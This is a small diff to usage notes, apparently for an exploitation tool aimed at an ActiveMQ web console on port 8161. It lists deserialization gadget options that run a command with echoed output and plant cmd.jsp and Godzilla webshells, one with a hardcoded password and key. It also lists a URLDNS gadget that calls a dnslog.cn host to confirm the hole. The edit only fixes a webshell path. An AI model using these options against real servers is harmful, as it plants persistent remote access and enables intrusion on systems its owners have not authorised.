@@ -31,7 +31,7 @@ gadget=spelclass cmd=whoami //有回显
 
 gadget=spelclass cmd=cmdjsp // http://rhost:8161/api/cmd.jsp
 
-gadget=spelclass cmd=godzillajsp // http://rhost:8161/api/godzillajsp pass:Tas9er key:B7VO2sAamj
+gadget=spelclass cmd=godzillajsp // http://rhost:8161/api/godzilla.jsp pass:Tas9er key:B7VO2sAamj
 
 gadget=urldns cmd=xxx.dnslog.cn
 
